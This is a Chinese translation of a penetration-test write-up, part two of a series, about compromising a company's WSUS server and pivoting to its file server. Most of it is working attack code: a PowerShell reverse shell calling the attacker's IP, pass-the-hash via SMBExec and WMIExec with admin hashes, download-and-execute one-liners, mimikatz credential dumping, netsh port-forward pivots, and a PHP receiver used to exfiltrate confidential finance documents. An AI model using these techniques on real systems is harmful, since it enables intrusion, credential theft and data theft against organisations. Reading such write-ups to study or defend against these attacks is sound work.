> 原文链接: https://www.anquanke.com//post/id/85961 


# 【技术分享】公司智能手机安全（二）——瞄准WSUS服务器


                                阅读量   
                                **81472**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：infosecinstitute.com
                                <br>原文地址：[resources.infosecinstitute.com/targeting-wsus-server/](resources.infosecinstitute.com/targeting-wsus-server/)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p5.ssl.qhimg.com/t0173b16e35342acbdf.jpg)](https://p5.ssl.qhimg.com/t0173b16e35342acbdf.jpg)



翻译：[村雨其实没有雨](http://bobao.360.cn/member/contribute?uid=2671379114)

预估稿费：150RMB

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿

<br>

该系列第一部分，请见[**[从APK到Golden Ticket：初步探测]**](http://bobao.360.cn/learning/detail/3762.html)

经过扫描发现，有两台主机能够满足我们的需求，给我们发送一个稳定的远程shell。他们分别是WSUS(Windows更新服务器)和Antivirus(反病毒相关服务器)，因为这些服务必须有Internet访问权限才能更新数据库，让我们从第一个开始。

有一个有趣的问题，本地管理员的NTLM哈希是否足以访问此服务器呢？也许我们的答案是肯定的。

在一家公司，所有服务器都使用相同的本地管理员密码其实很常见。这常常与第一次创建服务器有关系（非最佳实践），第一次被创建的服务器成为了模板，于是随后部署的实例都保留了原有的管理员密码。

经过一系列大型测试，现在事情变得更复杂了，我们有以下计划：

将我们之前的Powershell脚本(r1.ps1)放到公共web服务器上



```
function Invoke-r1
`{`
$client = New-Object Net.Sockets.TCPClient(‘&lt;OUR_PUBLIC_IP&gt;’,80)
$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%`{`0`}`
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
`{`
$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
$sendback = (iex $data 2&gt;&amp;1 | Out-String )
$sendback2 = $sendback + ‘PS ‘ + (pwd).Path + ‘&gt; ‘
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
$stream.Write($sendbyte,0,$sendbyte.Length)
$stream.Flush()
`}`
$client.Close()
`}`
```

用Tomcat的webshell上传[SMBExec(smb.ps1)](https://github.com/Kevin-Robertson/Invoke-TheHash/blob/master/Invoke-SMBExec.ps1)，这将允许我们[传递哈希](https://en.wikipedia.org/wiki/Pass_the_hash)进行身份验证

我们稍微修改了原始的SMBExec脚本，添加了一些行用于自动化漏洞利用。一旦被加载，它就会自动调用必要的参数连接到WSUS服务器，在我们的服务器下载反向shell到内存，然后执行



```
Invoke-SMBExec 
-Target &lt;SRVWSUS_IP&gt; 
-Username Administrator -Hash 604603ab105adc8XXXXXXXXXXXXXXXXX 
-Command 
“powershell `”IEX (New-Object Net.WebClient).DownloadString(`’http://&lt;OUR_PUBLIC_IP&gt;/r1.ps1`’); Invoke-r1`””
```

这就是我们的一体化解决方案：自动执行的SMBExec，自动下载并执行的Powershell脚本

在webshell里，我们执行了smb.ps1：



```
cmd /c powershell -executionpolicy bypass -f c:tomcatwebappscmdwarfilessmb.ps1
Command executed with service BHTLCPTEICLBHQPOVGSM on 192.168.178.62
```

这次攻击成功了，我们收到了来自SRVWSUS计算机的SYSTEM权限的Shell：



```
connect to &lt;OUR_PUBLIC_IP&gt; from &lt;COMPANY_PUBLIC_IP&gt; 50341
PS C:Windowssystem32&gt; whoami
nt authoritysystem
```

最终还是拿到了一个连接更稳定的shell，拜拜啦Android~

但现在我们的任务也与以前不同了，我们至今也没能找到窃取机密数据的方法。

我们同样注意到了，即使以本地管理员身份启动了smb.ps1，SMBExec也会以SYSTEM权限产生进程(记得之前的whoami结果吗)。或许使用[wmiexec.ps1](https://github.com/Kevin-Robertson/Invoke-TheHash/blob/master/Invoke-WMIExec.ps1)——一款强大的windows WMI接口的Powershell封装工具——会更适合下面的任务，因为它会使用传递的凭据运行远程进程。

我们再次运行mimikatz，依旧没有什么问题（我们是SYSTEM权限），这次SRVWSUS直接传递给我们了反向shell，而无需再上传文件。记住，"mymy"是我们对mimikatz混淆后的名字。



```
PS C:Windowssystem32&gt;iex (New-Object Net.WebClient).DownloadString(‘http://&lt;OUR_PUBLIC_IP&gt;/m.ps1’); Invoke-mymy
mimikatz(powershell) # sekurlsa::logonpasswords
Authentication Id : 0 ; 749566 (00000000:000b6ffe)
Session : Interactive from 2
User Name : administrator
Domain : SUPERCOMPANY
Logon Server : SRVDC1
Logon Time : 2/17/2017 4:23:28 PM
SID : S-1-5-21-3534665177-2148510708-2241433719-500
msv :
[00000003] Primary
* Username : Administrator
* Domain : SUPERCOMPANY
* NTLM : 446687c38d831f4XXXXXXXXXXXXXXXXX
    * SHA1 : 5cd9d993a606586XXXXXXXXXXXXXXXXXXXXXXXXX
[00010000] CredentialKeys
* NTLM : 446687c38d831f4XXXXXXXXXXXXXXXXX
    * SHA1 : 5cd9d993a606586XXXXXXXXXXXXXXXXXXXXXXXXX
tspkg :
wdigest :
* Username : Administrator
* Domain : SUPERCOMPANY
* Password : (null)
kerberos :
* Username : administrator
* Domain : SUPERCOMPANY.LOCAL
* Password : (null)
ssp :    KO
credman :
```

Wow！域管理员在服务器登录过，我们拿到了域管理员的哈希，收获不小。

游戏结束了吗？并没有！客户是叫我们去窃取机密信息，可我们还没拿到任何机密文件。可是我们现在知道应该在哪搜索了，文件服务器SRVFILE1

<br>

**定位文件服务器(SRVFILE1)**

还有什么比文件服务器更适合搜索文件的地方吗？有了域管理员的密码哈希，我们已经成功了一半了。有了之前的一体化SMBExec，我们只需要把本地管理员哈希替换为域管理员哈希。

从SRVWSUS的反向shell开始，我们试着用之前相同的步骤攻击服务器，但这次失败了。经过若干次尝试之后，我们得出结论，那台服务器被配置为禁止访问互联网。

新服务器需要新的计划了，最新的计划是用我们已有的SRVWSUS shell转到SRVFILE1上

步骤如下：

使用netsh将发送到SRVWSUS 8888端口的所有流量都转到攻击者443端口



```
＃SRVFILE1 &lt; - &gt; SRVWSUS：8888 &lt; - &gt; ATTACKER：443
netsh interface portproxy add v4tov4 listenport = 8888 listenaddress = 0.0.0.0 connectport = 443 connectaddress = &lt;OUR_PUBLIC_IP&gt;
```

在SRVWSUS上传第二个反向shell脚本r2.ps1，在我们的web服务器上：

```
(New-Object Net.WebClient).DownloadFile(‘http://&lt;OUR_PUBLIC_IP&gt;/r2.ps1’, ‘c:tmpr2.ps1’)
```

r2.ps1与之前的脚本不同，因为它是连接到SRVWSUS而不是我们的公共IP



```
…
$client = New-Object System.Net.Sockets.TCPClient(‘’,8888)
…
```

* 在SRVWSUS上下载一个简单的PowerShell HTTPServer：



```
# http.ps1
start-job `{` # will execute in background
$p=”c:tmp”
$H=New-Object Net.HttpListener
$H.Prefixes.Add(“http://+:8001/”)
$H.Start()
While ($H.IsListening) `{`
$HC=$H.GetContext()
$HR=$HC.Response
$HR.Headers.Add(“Content-Type”,”text/plain”)
     $file=Join-Path $p ($HC.Request).RawUrl
$text=[IO.File]::ReadAllText($file)
    $text=[Text.Encoding]::UTF8.GetBytes($text)
$HR.ContentLength64 = $text.Length
$HR.OutputStream.Write($text,0,$text.Length)
$HR.Close()
`}`
$H.Stop()
`}`
```

启动HTTP监听并且放入后台，SRVFILE1将从这里下载我们的反向shell

```
PS C:tmp&gt; .http.ps1
```

我们用WMIExec代替了SMBExec，从我们的网络服务器下载了SRVWSUS的wmiexec.ps1文件：



```
PS C:tmp&gt; (New-Object Net.WebClient).DownloadFile(‘http://&lt;OUR_PUBLIC_IP&gt;/wmiexec.ps1‘, ‘c:tmpwmiexec.ps1’)
The file contained the following Invoke-WMIExec function at the end:
Invoke-WMIExec 
-Target &lt;SRVFILE1_IP&gt; -Domain SUPERCOMPANY 
-Username Administrator -Hash 446687c38d831f4XXXXXXXXXXXXXXXXX 
-Command 
“powershell `”IEX (New-Object Net.WebClient).DownloadString(`’http://&lt;SRVWSUS_IP&gt;:8001/r2.ps1`’); Invoke-r2`””
```

运行wmiexec.ps1：



```
PS C:tmp&gt; .wmiexec.ps1
Command executed with process ID 4756 on 192.168.178.195
```

在这个故事的末尾，我们非常“神奇”的从SRVFILE1得到了域管理员权限的shell



```
connect to [our-webserver] from [company-ip] 49190
PS C:Windowssystem32&gt; whoami
supercompanyadministrator
```

这个图像应该有助于了解这个流程：

[![](https://p0.ssl.qhimg.com/t016f36a4188526c07b.png)](https://p0.ssl.qhimg.com/t016f36a4188526c07b.png)

在我们内网漫游的最后阶段，我们只需要找到几个机密文件就好了。快速查看过硬盘之后，我们发现了一些东西：



```
Directory: F:FinanceReserved
Mode LastWriteTime Length Name
—- ————- —— —-
-a— 9/24/2016 2:20 AM 164468 Supersecret.docx
-a— 5/29/2016 6:41 PM 12288 Balance.xlsx
…
```

这就是我们需要的文件！只需要把他们拿到手，就能够证明漏洞了。

高兴了五分钟之后，我们反过来问自己：该怎样拿到文件呢？首先试了试我们公网服务器的FTP，但运气不佳，对方公司的防火墙屏蔽了服务。所以我们决定通过HTTP上传。

现在该是介绍我们钟爱的PHP语言的时候了，没错，我们大爱PHP~

我们在公网web服务器上用了一个简单的上传脚本



```
&lt;?php
// index.php
$pic = @$_FILES[‘pic’][‘name’];
$pic_loc = @$_FILES[‘pic’][‘tmp_name’];
echo (@move_uploaded_file($pic_loc,$pic)) ? “DONE” : “ERROR”; ?&gt;
```

接下来需要的就是一个带有文件上传功能的HTTP客户端了。[**Google一番**](http://blog.majcica.com/2016/01/13/powershell-tips-and-tricks-multipartform-data-requests/)，发现了一个极佳的Powershell脚本，于是上传到了SRVWSUS，命名为upload.ps1

要传送文件，就必须建立一个连接，在SRVWSUS上添加一条新的端口转发规则，这次在8889端口：



```
# SRVFILE1 &lt;-&gt; SRVWSUS:8889 &lt;-&gt; ATTACKER:80
interface portproxy add v4tov4 listenport=8889 listenaddress=0.0.0.0 connectport=80 connectaddress=&lt;OUR_PUBLIC_IP&gt;
```

设置好之后，就在SRVFILE1下载和执行了HTTP上传脚本。请注意，文件从SRVWSUS的8889端口下载，该端口映射到了我们服务器上PHP运行的80端口。我们的443端口映射的是SRVWSUS的8888端口，反向shell从那里接收命令。



```
PS C:tmp&gt;(New-Object Net.WebClient).DownloadFile(‘http://&lt;SRVWSUS_IP&gt;:8889/up.ps1′,’c:tmpupload.ps1’)
PS C:tmp&gt;. .upload.ps1
PS C:tmp&gt; invoke-upload -infile f:financereservedSupersecret.docx -uri http://&lt;SRVWSUS_IP&gt;:8889/
content:System.Net.Http.StreamContent
DONE
PS C:tmp&gt; invoke-upload -infile f:financereservedbalance.xlsx -uri http://&lt;SRVWSUS_IP&gt;:8889/
content:System.Net.Http.StreamContent
DONE
```

[![](https://p3.ssl.qhimg.com/t018e47b23fcb42c9e8.png)](https://p3.ssl.qhimg.com/t018e47b23fcb42c9e8.png)

成功将机密文件转窃取到了我们的web服务器，任务完成！

这次我们没有发现什么太大的文件，如果有的话，可以用zip压缩他们，powershell命令如下：



```
$src= “f:finance”
$dst= “c:tmpfiles.zip”
[Reflection.Assembly]::LoadWithPartialName(“System.IO.Compression.FileSystem”)
[System.IO.Compression.ZipFile]::CreateFromDirectory($src,$dst,[System.IO.Compression.CompressionLevel]::Optimal,$true)
```
